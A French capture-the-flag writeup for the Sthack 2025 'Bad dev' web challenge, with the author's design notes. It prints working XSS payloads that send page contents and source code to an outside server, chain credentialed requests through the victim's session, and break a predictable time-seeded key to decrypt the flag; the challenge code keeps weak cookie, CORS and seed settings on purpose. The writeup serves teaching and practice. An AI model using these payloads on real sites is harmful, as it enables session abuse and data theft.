---
title: "Bad Dev, Sthack 25"
date: "2025-06-02"
description: "Comme chaque année, j'ai écrit un petit challenge pour la Sthack. C'est l'occasion ici de parler de sa création et de vous partager le [writeup](/writeups) associé."
categories:
  - "non-classe"
  - "writeups"
tags:
  - "sthack"
  - "writeup"
image: "/medias/writeups/bad-dev/baddev.jpg"
outline: [2, 4]
---

# Bad dev - Writeup Sthack 25

Comme chaque année j'ai écrit un petit challenge pour la Sthack. Et comme chaque année il s'agirat d'une XSS. Les participants étant à présent habitué cela me permet d'explorer toujours plus les possibilités qu'offrent ces vulnérabilités.

## Writeup

### Reconnaissance

Le contexte du challenge est le suivant :

```
Notre developpeur préféré à mis en place une interface pour que vous puissiez le contacter.
Il lit tous vos messages.
Nous savons qu'il héberge une application en cours de développement sur son réseau.
Nous comptons sur vous pour récupérer le flag qu'elle héberge.
```

Je comprends vite qu'un bot va lire un message qui nous sera envoyé, cela constituera la première étape.
L'application ne propose en effet qu'un simple formulaire.

![interface](/medias/writeups/bad-dev/image.png)

Le script suivant permet de mettre en évidence la présence d'une XSS :

```html
<script>
  window.location.href = "https://vps.shoxxdj.fr/yeah";
</script>
```

La requête est bien recue coté serveur, le code s'execute parfaitement sur la partie administrateur.

### Exploration de la partie admin

Je peux maintenant explorer la partie "admin", pour cela il faut adapter le code coté serveur. Par habitude, je développe ce code en nodejs.

```javascript
const express = require("express");
const app = express();
const PORT = 80;

app.use(express.json());

app.get("/", (req, res) => {
  console.log("get /");
  res.end("ok");
});

app.get("/:anything", (req, res) => {
  console.log(req.params.anything);
  res.end("ok");
});

app.post("/:anything", (req, res) => {
  console.log(req.params.anything);
  console.log(req.body);
  res.status(200).json({ message: "Données reçues 👍" });
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Serveur démarré sur http://localhost:${PORT}`);
});
```

Le payload est aussi à adapter. Je commence par récupérer l'ensemble de la page HTML accessible, le plus simple est de l'encoder en base64 puis de le poster vers le serveur distant.

```html
<script>
  const destinationUrl = "https://vps.shoxxdj.fr";
  function notify(path, data) {
    return fetch(destinationUrl + path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
  }

  (async () => {
    try {
      await notify("/part-two", {
        status: "ok",
        page: btoa(document.documentElement.outerHTML),
      });
    } catch (err) {
      await notify("/error", {
        status: "not ok",
        val: err.message || String(err),
      });
    }
  })();
</script>
```

![Code Recu](/medias/writeups/bad-dev/image-1.png)

Le code décodé ressemble à cela :

```html
html><head></head>
<body>
  <h1>Main admin panel</h1>
  <ul>
    <li><a href="https://under_construction.local/">Local Dev Version</a></li>
    <li><a href="/source_code">LocalDev SourceCode</a></li>
    <li><a href="https://sthack.fr/">Best conference Ever</a></li>
    <li><a href="https://shoxxdj.fr">I love this man</a></li>
  </ul>
  <hr />
  <i>User message : </i>
  [...]
</body>
```

Je tronque la fin car il s'agit du payload. Seulement deux élléments sont interessants :

- /source_code
- https://under_construction.local

Il est à présent temps de récupérer le code source et de l'envoyer sur le serveur distant :

```html
<script>
  const destinationUrl = "https://vps.shoxxdj.fr";
  function notify(path, data) {
    return fetch(destinationUrl + path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
  }

  (async () => {
    try {
      // await notify("/part-two", {
      //   status: "ok",
      //   page: btoa(document.documentElement.outerHTML),
      //});

      const response = await fetch("/source_code");
      const html = await response.text();

      await notify("/sourcecode", { status: "ok", content: html });
    } catch (err) {
      await notify("/error", {
        status: "not ok",
        val: err.message || String(err),
      });
    }
  })();
</script>
```

Le code est obtenu coté serveur. Le voici :

```javascript
const FLAG = "Not the real one :)";

const redConfig = {
  port: 6379,
  srv: "redis",
};

const session_duration = 120;
const base_cash = 300;

import express from "express";
import session from "express-session";
import { createCanvas } from "canvas";
import { createClient } from "redis";
//import sha256 from 'sha256';
import morgan from "morgan";

import * as crypto from "crypto";

function generateCaptchaText(length = 6) {
  const now = new Date();
  const seconds = now.getUTCSeconds().toString().padStart(2, "0");
  const seed = `second-${seconds}`;
  const hash = crypto.createHash("sha256").update(seed).digest();
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let captcha = "";
  for (let i = 0; i < length; i++) {
    captcha += chars[hash[i] % chars.length];
  }
  return captcha;
}

function generateCaptchaImage(text) {
  const canvas = createCanvas(200, 70);
  const ctx = canvas.getContext("2d");
  ctx.fillStyle = "#f0f0f0";
  ctx.fillRect(0, 0, 200, 70);
  ctx.font = "36px Arial";
  ctx.fillStyle = "#333";
  ctx.fillText(text, 30, 50);
  return canvas.toDataURL();
}

const session_alive = (rdb) => {
  return (req, res, next) => {
    const username = req.session?.username?.toString() ?? null;
    if (username != null) {
      rdb
        .get(username)
        .then((value) => {
          console.log("Redis Value:", value);
          if (value) {
            next();
          } else {
            req.session.username = null;
            res.redirect("/fail");
          }
        })
        .catch((err) => {
          console.error("Redis error:", err);
          res.redirect("/fail");
        });
    } else {
      req.session.username = null;
      res.redirect("/fail");
    }
  };
};

async function connectRedis() {
  const client = createClient({
    url: `redis://${redConfig.srv}:${redConfig.port}`,
  });

  client.on("error", (err) => {
    console.error("Erreur Redis:", err);
  });

  client.on("connect", () => {
    console.log("Connecté à Redis");
  });

  await client.connect();
  return client;
}

const app = express();
import cors from "cors";

app.set("trust proxy", true);

// Session setup
app.use(
  session({
    secret: "super-secret-captchaXX",
    resave: false,
    saveUninitialized: true,
    cookie: {
      httpOnly: false,
      sameSite: "none",
      secure: true,
    },
  })
);

app.use(
  cors({
    origin: "https://admin_website.local",
    credentials: true,
  })
);

app.use((req, res, next) => {
  console.log("Origin header:", req.headers.origin);
  next();
});

// Express setup
app.set("view engine", "ejs");
app.use(morgan("dev"));
app.use(express.static("public"));
app.use(express.urlencoded({ extended: true }));

// Redis setup
const rdb = await connectRedis();

app.set("etag", false);

// Routes
app.get("/", (req, res) => {
  const captchaText = generateCaptchaText();
  const captchaImage = generateCaptchaImage(captchaText);
  req.session.captcha = captchaText;
  console.log("Session captcha is :" + req.session.captcha);
  res.render("index", { captchaImage, captchaText });
});

app.get("/fail", (req, res) => {
  res.end("Wrong session, either expired or not created");
});

import * as openpgp from "openpgp";
import { sha256 } from "@noble/hashes/sha256";

function utf8ToBytes(str) {
  return new TextEncoder().encode(str);
}

function bytesToHex(bytes) {
  return Buffer.from(bytes).toString("hex");
}

function generateKeyPairFromSeed(seed) {
  const seedBytes = utf8ToBytes(seed);
  const privateKey = sha256(seedBytes);
  const publicKey = getPublicKey(privateKey, true);

  return {
    privateKey: bytesToHex(privateKey),
    publicKey: bytesToHex(publicKey),
  };
}

function hexToBytes(hex) {
  return Uint8Array.from(Buffer.from(hex, "hex"));
}

import { getPublicKey, getSharedSecret } from "@noble/secp256k1";

function encryptWithPublicKey(publicKeyHex, message) {
  const recipientPub = hexToBytes(publicKeyHex);
  const ephemeralPriv = crypto.randomBytes(32);
  const ephemeralPub = getPublicKey(ephemeralPriv, true);

  const sharedSecret = getSharedSecret(ephemeralPriv, recipientPub);
  const aesKey = sha256(sharedSecret.slice(1)); // remove prefix byte

  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", Buffer.from(aesKey), iv);
  const ciphertext = Buffer.concat([
    cipher.update(message, "utf8"),
    cipher.final(),
  ]);
  const tag = cipher.getAuthTag();

  return {
    iv: bytesToHex(iv),
    tag: bytesToHex(tag),
    ciphertext: bytesToHex(ciphertext),
    ephemeralPub: bytesToHex(ephemeralPub),
  };
}

app.post("/register", async (req, res) => {
  console.log("session" + JSON.stringify(req.session));
  const captcha = req.body.captcha;
  const username = req.body.username.toString();
  const password = req.body.password.toString();
  const redPassword = bytesToHex(sha256(password));
  let exists = await rdb.get(username);
  let user_cash = base_cash;

  if (exists == null) {
    if (captcha === req.session.captcha) {
      try {
        await rdb.set(username, user_cash, { EX: session_duration });
        await rdb.set(username + "_password", redPassword, {
          EX: session_duration,
        });

        const secret = FLAG;
        const { privateKey, publicKey } = generateKeyPairFromSeed(
          captcha + redPassword
        );
        const encrypted = encryptWithPublicKey(publicKey, secret);
        const jsonHex = Buffer.from(JSON.stringify(encrypted)).toString("hex");
        console.log(privateKey);
        console.log(jsonHex);
        await rdb.set(username + "_private_key", privateKey.toString(), {
          EX: session_duration,
        });
        await rdb.set(username + "_secret", jsonHex.toString(), {
          EX: session_duration,
        });

        res.end("Account created !");
      } catch (err) {
        console.log(err);
        res.end("Unexpected error, call an admin");
      }
    } else {
      console.log("Expected Captcha : " + req.session.captcha);
      console.log("Receveid : " + req.body.captcha);
      res.end("Wrong captcha sorry.");
    }
  } else {
    res.end("Sorry this username has already been taken");
  }
});

app.post("/login", (req, res) => {
  let username = req.body.username.toString();
  let password = bytesToHex(sha256(req.body.password.toString()));
  //get password
  rdb.get(username + "_password").then((pass) => {
    if (pass == password) {
      req.session.username = username;
      res.redirect("/shop");
    } else {
      req.session = null;
      res.end("wrong password");
    }
  });
});

app.get("/shop", session_alive(rdb), (req, res) => {
  rdb
    .get(req.session.username)
    .then((cash) => {
      res.render("shop.ejs", { cash: cash });
    })
    .catch((err) => {
      res.end("unexpected error");
    });
});

function updateCash(rdb, username, movment) {
  console.log("will update cash");
  rdb.get(username).then((value) => {
    if (value) {
      let newVal = parseInt(value) + movment;
      rdb.ttl(username).then((ttl) => {
        rdb.set(username, newVal, { EX: ttl });
      });
    } else {
      req.session.username = null;
      res.redirect("/fail");
    }
  });
}

app.post("/buy/:item", session_alive(rdb), async (req, res) => {
  let user_cash = await rdb.get(req.session.username);
  if (user_cash < 300) {
    res.end("no enough cash !");
  } else {
    if (req.params.item == "key") {
      updateCash(rdb, req.session.username, -300);
      rdb
        .get(req.session.username + "_private_key")
        .then((value) => {
          console.log(value);
          res.render("give_item.ejs", { item: value });
        })
        .catch((err) => {
          res.end("unexpected error");
        });
    } else if (req.params.item == "secret") {
      updateCash(rdb, req.session.username, -300);
      rdb
        .get(req.session.username + "_secret")
        .then((value) => {
          console.log(value);
          res.render("give_item.ejs", { item: value });
        })
        .catch((err) => {
          res.end("unexpected error");
        });
    }
  }
});

app.get("/add/cash", (req, res) => {
  res.end("need to develop this feature");
});

// // Démarrer le serveur
app.listen(80, () => {
  console.log("Serveur lancé sur le port 80");
});

// Fermer Redis proprement
process.on("SIGINT", async () => {
  await rdb.quit();
  process.exit();
});
```

Après une analyse du code voici les élléments importants :

- L'application est accessible via HTTPS, il y a surement un reverse proxy nginx devant
- L'application contient le flag
- A l'enregistrement un captcha doit être validé
- Une fois le captcha validé un compte est créé et valide pendant 2 minutes.
- Le flag est chiffré avec une clef généré à l'enregistrement
- Il est possible d'"acheter" le flag chiffré ou la clef mais pas les deux
- L'algorithme utilisé pour les clefs est "@noble/secp256k1"

### Génération de la clef

La génération de clef est sensible tout d'abord celle-ci est généré à partir d'une seed en partie gérée par l'utilisateur :

```javascript
function generateKeyPairFromSeed(seed) {
  const seedBytes = utf8ToBytes(seed);
  const privateKey = sha256(seedBytes);
  const publicKey = getPublicKey(privateKey, true);

  return {
    privateKey: bytesToHex(privateKey),
    publicKey: bytesToHex(publicKey),
  };
}

app.post("/register", async (req, res) => {
  const redPassword = bytesToHex(sha256(password));
  const captcha = req.body.captcha;
  [...]
  if (captcha === req.session.captcha) {
    [...]
    const { privateKey, publicKey } = generateKeyPairFromSeed(
      captcha + redPassword
    );
  }
}
```

La fonction `generateKeyPairFromSeed` permet de créer la paire de clef. La clef privée est générée à partir de la seed provenant d'une combinaison du captcha généré et du mot de passe choisi par l'utilisateur.

La seconde partie est directement maitrisalbe. La fonction de génération du captcha est la suivante :

```javascript
function generateCaptchaText(length = 6) {
  const now = new Date();
  const seconds = now.getUTCSeconds().toString().padStart(2, "0");
  const seed = `second-${seconds}`;
  const hash = crypto.createHash("sha256").update(seed).digest();
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let captcha = "";
  for (let i = 0; i < length; i++) {
    captcha += chars[hash[i] % chars.length];
  }
  return captcha;
}
```

Celle-ci génère la partie manquante de la seed à partir de la seconde en cours. Ainsi, il existe au maximum 60 valeurs et celles-ci reviennent de manière cyclique.

Ceci peut être prouvé avec le script suivant :

```javascript
import * as crypto from "crypto";

function generateCaptchaText(length = 6) {
  const now = new Date();
  const seconds = now.getUTCSeconds().toString().padStart(2, "0");
  const seed = `second-${seconds}`;
  const hash = crypto.createHash("sha256").update(seed).digest();
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let captcha = "";
  for (let i = 0; i < length; i++) {
    captcha += chars[hash[i] % chars.length];
  }
  return { seed, captcha };
}

let { seed, captcha } = generateCaptchaText();
console.log(seed, captcha);
```

Et en le lancant en boucle :

```bash
timeout 70s bash -c "while true; do node captcha.js; done "
```

Ceci permet de valider que les seed sont identiques chaque secondes.

### Résolution

A partir du code obtenu, je sais maintenant qu'il faut :

- Résoudre le captcha
- Récupérer le flag chiffré

Deux options sont disponibles pour la suite :

- Soit réitérer l'opération jusqu'à avoir un captcha identique et ainsi la meme paire de clef, ce qui produira le meme résultat chiffré. A ce moment la il suffira d'acheter la clef.
- Soit générer la clef à partir de la seed.

Disposant de l'ensemble du code je choisi la seconde option.

Il faut à présent, récupérer le captcha, le résoudre coté attaquant le renvoyer et récupérer la clef.

```html
<script>
  const sourceUrl = "https://under_construction.local";
  const destinationUrl = "https://vps.shoxxdj.fr";

  function notify(path, data) {
    return fetch(destinationUrl + path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
  }

  async function waitResponse(path, data) {
    const response = await fetch(destinationUrl + path, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });
    const result = await response.json();
    return result.data;
  }

  (async () => {
    try {
      await notify("/part-two", { status: "xssed" });

      const response = await fetch(sourceUrl, {
        credentials: "include",
      });
      const html = await response.text();
      const captcha = await waitResponse("/captcha", {
        bla: "ok1",
        content: html,
      });
      const respon = await fetch(sourceUrl + "/register", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
          username: "a",
          password: "a",
          captcha: captcha,
        }),
      });

      const htm = await respon.text();
      await notify("/register_done", { content: htm });
      const respo = await fetch(sourceUrl + "/login", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
          username: "a",
          password: "a",
        }),
      });

      const ht = await respo.text();
      await notify("/login_done", { content: ht });
      const resp = await fetch(sourceUrl + "/buy/secret", {
        method: "POST",
        credentials: "include",
      });
      const h = await resp.text();
      await notify("/get_secret", { content: h });
    } catch (err) {
      await notify("/error", {
        status: "not ok",
        val: String(err),
      });
    }
  })();
</script>
```

Ce script inclus l'option "credentials:'include'" lors des requêtes FETCH afin de garantir la conservation de la session, cela est possible grace à l'utilisation de HTTPS dans l'ensemble du challenge ainsi qu'a une configuration CORS adaptée.

Le code coté serveur doit égallement être adapté :

```javascript
const express = require("express");
const fs = require("fs");
const path = require("path");
const child_process = require("child_process");

const app = express();
const PORT = 80;

const cors = require("cors");
app.use(cors());
app.options("*", cors());
// Middleware pour parser le JSON
app.use(express.json());

app.get("/", (req, res) => {
  console.log("get /");
  res.end("ok");
});

app.get("/:anything", (req, res) => {
  console.log(req.params.anything);
  res.end("ok");
});

// Route pour recevoir les données
app.post("/:anything", (req, res) => {
  console.log(req.params.anything);
  console.log(req.body);
  if (req.params.anything === "captcha") {
    console.log("WANT CAPTCHA");
    console.log(req.body);
    const match = req.body.content.match(
      /<img[^>]+src="data:image\/png;base64,([^"]+)"/
    );
    if (match && match[1]) {
      const base64Image = match[1];
      // 📁 Écriture du fichier image
      fs.writeFileSync("image.png", base64Image, "base64");
      console.log("✅ image.png créée avec succès");
      child_process.exec("gocr -i image.png", (error, stdout, stderr) => {
        if (error) {
          console.error(`❌ Erreur d'exécution de gocr: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`⚠️ STDERR: ${stderr}`);
        }
        console.log(`🧾 Résultat OCR: ${stdout}`);
        res.json({ data: stdout.trim() });
      });
    } else {
      console.error("❌ Image base64 non trouvée dans le contenu HTML");
    }
  } else {
    res.status(200).json({ message: "Données reçues 👍" });
  }
});

// Démarrer le serveur
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Serveur démarré sur http://localhost:${PORT}`);
});
```

J'utilise ici gocr pour la résolution du captcha, celui-ci étant très basique ce simple OCR suffit.
Une fois le payload envoyé, le contenu suivant est renvoyé :

```
[...]
🧾 Résultat OCR: JhKKLT

register_done
{ content: 'Account created !' }
part-two
[...]

get_secret
{
  content: '<html>\n' +
    '\n' +
    'Your item ! \n' +
    '<pre>\n' +
    '7b226976223a22373335396235383661636234613630336161333739643939222c22746167223a223032313530346566653063656162383135633062376361613965303730333431222c2263697068657274657874223a226633626132333364393162636262303139633964313537336531633563376162343732366638646464366232313531643532373964356532323536363265222c22657068656d6572616c507562223a22303261393963376533323361623237336231383037393566303361316431376262303735636364383462306638313264613331646362636634323330616164313766227d \n' +
    '</pre>\n' +
    '<br/>\n' +
    '</html>'
}
```

La seed vaut alors `"JhKKLT"+bytesToHex(sha256("a"))`.

Le code de déchiffrement est alors :

```javascript
#!/usr/bin/env node

const crypto = require("crypto");
const { getSharedSecret } = require("@noble/secp256k1");
const { sha256 } = require("@noble/hashes/sha256");
const { getPublicKey } = require("@noble/secp256k1");

// Helpers
function hexToBytes(hex) {
  return Uint8Array.from(Buffer.from(hex, "hex"));
}

function bytesToHex(bytes) {
  return Buffer.from(bytes).toString("hex");
}

function utf8ToBytes(str) {
  return new TextEncoder().encode(str);
}

function decryptWithPrivateKey(privKey, encryptedHex) {
  const encryptedJson = JSON.parse(
    Buffer.from(encryptedHex, "hex").toString("utf8")
  );

  const ephemeralPub = hexToBytes(encryptedJson.ephemeralPub);
  const sharedSecret = getSharedSecret(privKey, ephemeralPub);
  const aesKey = sha256(sharedSecret.slice(1));

  const iv = hexToBytes(encryptedJson.iv);
  const tag = hexToBytes(encryptedJson.tag);
  const ciphertext = hexToBytes(encryptedJson.ciphertext);

  const decipher = crypto.createDecipheriv(
    "aes-256-gcm",
    Buffer.from(aesKey),
    iv
  );
  decipher.setAuthTag(tag);

  const decrypted = Buffer.concat([
    decipher.update(ciphertext),
    decipher.final(),
  ]);

  return decrypted.toString("utf8");
}

function generateKeyPairFromSeed(seed) {
  const seedBytes = utf8ToBytes(seed);
  const privateKey = sha256(seedBytes);
  const publicKey = getPublicKey(privateKey, true);

  return {
    privateKey: bytesToHex(privateKey),
    publicKey: bytesToHex(publicKey),
  };
}

// --- CLI ---
if (process.argv.length !== 5) {
  console.error(
    "Usage: node decrypt-from-private.js <seed> <password> <encryptedHex>"
  );
  process.exit(1);
}

const captcha = process.argv[2];
const password = process.argv[3];
const encryptedHex = process.argv[4];

const seed = captcha + bytesToHex(sha256(password));
const { privateKey, _ } = generateKeyPairFromSeed(seed);

try {
  const message = decryptWithPrivateKey(privateKey, encryptedHex);
  console.log("📬 Decrypted message:");
  console.log(message);
} catch (err) {
  console.error("❌ Error during decryption:", err.message);
  process.exit(2);
}
```

Celui-ci reprends les méthodes proposés dans le code coté serveur et ajoute les fonctions nécéssaires au calcul de la seed à partir du captcha et du mot de passe choisi.

```bash
node sdecrypt.cjs JhKKLT a 7b226976223a22373335396235383661636234613630336161333739643939222c22746167223a223032313530346566653063656162383135633062376361613965303730333431222c2263697068657274657874223a226633626132333364393162636262303139633964313537336531633563376162343732366638646464366232313531643532373964356532323536363265222c22657068656d6572616c507562223a22303261393963376533323361623237336231383037393566303361316431376262303735636364383462306638313264613331646362636634323330616164313766227d
📬 Decrypted message:
STHACK{c0rs_4llm0st_ru1n3d_4ll}
```

And voila :).

## Conception du challenge

L'une des seules choses que je savais avant de commencer à écrire ce challenge, c'est que je voulais qu'il tourne autour d'une XSS. Depuis quelques années j'ai une affection particulière pour ces vulnérabilités.

Cependant, un mois avant l'évènement, rien de plus. J'ai donc pris une feuille, écrit "XSS" au milieu et puis je l'ai regardé, j'ai écrit plein de choses et je l'ai jettée.

J'ai pris une feuille, à nouveau écrit "XSS" ...

Petit à petit les choses se sont affinées. Résoudre un captcha au travers d'une XSS était une idée qui me plaisait bien, ainsi l'attaquant se retrouvera avec un compte, oui mais pour faire quoi ?

Cette étape à été la plus longue à décider. Je ne voulait pas mettre en place une RCE identiques aux années précédantes. Et puis le temps manquait, et j'ai alors eu l'idée de vouloir exploiter un bug logique.

Le concept était que l'utilisateur devrait acheter deux élléments, mais ne disposerait pas assez d'argent. Ainsi à l'aide d'un bug logique il serait possible d'obtenir un remboursement d'un fichier téléchargé et ainsi obtenir le second.

Pratique / Théorie et manque de temps, et voici cette idée qui tombe à l'eau.

Après une nuit de réflexion, je me suis dit que le mieux serait d'exploiter un bug de code. Le code serait accessible evidement. Un classique certes, mais après avoir trouvé une librairie permettant de créer des clefs de chiffrement dépendante d'une seed manipulable tout les élléments étaient présents.

Presque tous ! Car à l'origine, je souhaitait que la XSS serve uniquement à créer le compte. Mais pourquoi sous utiliser l'éllement principal de l'épreuve ? Ainsi c'était décidé, tout devra se faire au travers de la XSS.

![Reflexion initale](/medias/writeups/bad-dev/2025-06-06-17-31-27-image.png)

Dans la conception pas de problème. En pratique, cela implique de devoir gérer les spécificités du CORS.

Car oui, envoyer des cookies vers un domaine tiers en javascript n'est pas si trivial. Cela à forcé la mise en place de certificats HTTPS. Et des certificats qui doivent être approuvés !

Pour cela, j'ai utilisé mkcert et installé les certificats dans les différents containers. Une fois tout en place, le projet final ressemble à cela :

![Resultat](/medias/writeups/bad-dev/2025-06-06-17-32-40-image.png)

L'ajout de deux containers nginx pour la terminaison TLS ajoute du réalisme et permet surtout l'envoie de cookies.

Pour résoudre le challenge, l'utlisation de "credentials:'include'" est obligatoire afin de garder la session authentifiée.

Si vous souhaitez essayer ce challenge les sources sont disponibles sur [Github]([sthack-tasks/2025/Web at main · shoxxdj/sthack-tasks · GitHub](https://github.com/shoxxdj/sthack-tasks/tree/main/2025/Web)) !
